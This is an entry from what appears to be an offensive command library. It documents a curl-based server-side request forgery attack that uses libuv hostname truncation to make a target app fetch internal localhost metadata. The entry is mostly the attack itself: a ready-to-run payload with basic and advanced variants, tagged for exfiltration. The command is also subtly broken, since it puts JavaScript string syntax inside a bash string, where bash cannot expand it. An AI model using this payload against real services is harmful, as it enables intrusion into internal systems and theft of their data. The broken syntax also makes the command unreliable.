---
data: >-
  curl -X GET
  "http://target-app.com/api/fetch?url=http://${'a'.repeat(255)}0x7f000001:80/metadata"
  -v
tags:
  - ssrf
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - 'Cross-platform (Unix, Windows)'
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.584Z'
id: 6ce71e24-8fb0-447f-be5c-580bbe111e83
verified: false
validated: true
submitted: true
---
# curl-internal-fetch

## Command

```bash
curl -X GET "http://target-app.com/api/fetch?url=http://${'a'.repeat(255)}0x7f000001:80/metadata" -v
```

## Description

This command uses SSRF to fetch sensitive internal data, such as metadata from localhost:80, via the truncated hostname exploit in libuv.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| `-v` | Verbose output for debugging | No |
| `url=...` | SSRF payload targeting internal metadata | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://target-app.com/api/fetch?url=http://${'a'.repeat(255)}0x7f000001:80/metadata"
```

### Advanced Usage

```bash
curl -X GET "http://target-app.com/api/fetch?url=http://${'a'.repeat(255)}0x7f000001:80/metadata" -v -o output.txt
```

## Expected Output

Internal metadata content in the response body, with verbose logs showing the connection details.

## Related

- [[Related Procedure|procedures/Exploit-Libuv-Hostname-Truncation-for-SSRF]]
